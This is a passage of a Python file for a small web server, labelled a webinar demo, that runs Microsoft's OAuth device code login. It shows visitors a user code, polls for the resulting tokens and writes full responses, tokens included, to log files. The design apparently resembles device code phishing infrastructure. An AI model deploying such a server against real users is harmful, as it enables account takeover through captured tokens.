                text = self._req_body.decode("utf-8", errors="replace")
                try:
                    lines.append(json.dumps(json.loads(text), indent=2))
                except Exception:
                    lines.append(text)
            except Exception:
                lines.append(repr(self._req_body))
        lines.append("")

        # --- response ---
        lines.append("<<< RESPONSE")
        lines.append("Status: %s" % self._resp_status)
        for k, v in self._resp_headers:
            lines.append("%s: %s" % (k, v))

        raw = self._resp_body.getvalue()
        if raw:
            lines.append("")
            # raw includes the HTTP status line + headers + body; skip to body after \r\n\r\n
            split = raw.find(b"\r\n\r\n")
            body_bytes = raw[split + 4:] if split != -1 else raw
            if body_bytes:
                try:
                    text = body_bytes.decode("utf-8", errors="replace")
                    try:
                        lines.append(json.dumps(json.loads(text), indent=2))
                    except Exception:
                        # truncate large HTML bodies
                        lines.append(text[:2000] + ("... [truncated]" if len(text) > 2000 else ""))
                except Exception:
                    lines.append(repr(body_bytes[:512]))

        content = "\n".join(lines) + "\n"
        with _log_lock:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)

    def log_message(self, fmt, *args):
        print("[%s] %s" % (self.address_string(), fmt % args))

    def send_json(self, data, status=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        self._req_body = body
        return body

    def ms_post(self, url, params):
        data = urllib.parse.urlencode(params).encode("utf-8")
        req  = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode("utf-8"))

    # ---- GET / ---------------------------------------------------------------
    def serve_html(self):
        params = {
            "client_id": CLIENT_ID,
            "resource":  RESOURCE,
            "scope":     SCOPES,
        }
        status, dc = self.ms_post(DC_URL, params)
        if status != 200 or "device_code" not in dc:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(b"Failed to obtain device code.")
            return

        html = build_html(
            dc["device_code"],
            dc.get("user_code", ""),
            dc.get("verification_url", "https://microsoft.com/devicelogin"),
            dc.get("expires_in", 900),
            dc.get("interval", 5),
        )
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    # ---- POST /poll ----------------------------------------------------------
    def handle_poll(self):
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return

        params = {
            "client_id":  CLIENT_ID,
            "resource":   RESOURCE,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "code":       body.get("device_code", ""),
        }
        status, data = self.ms_post(TOKEN_URL, params)
        self.send_json(data, status)

    # ---- router --------------------------------------------------------------
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/":
            self.serve_html()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/poll":
            self.handle_poll()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    server = HTTPServer(("", PORT), Handler)
    print("Webinar demo server running at http://localhost:" + str(PORT))
    print("Press Ctrl+C to stop.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")
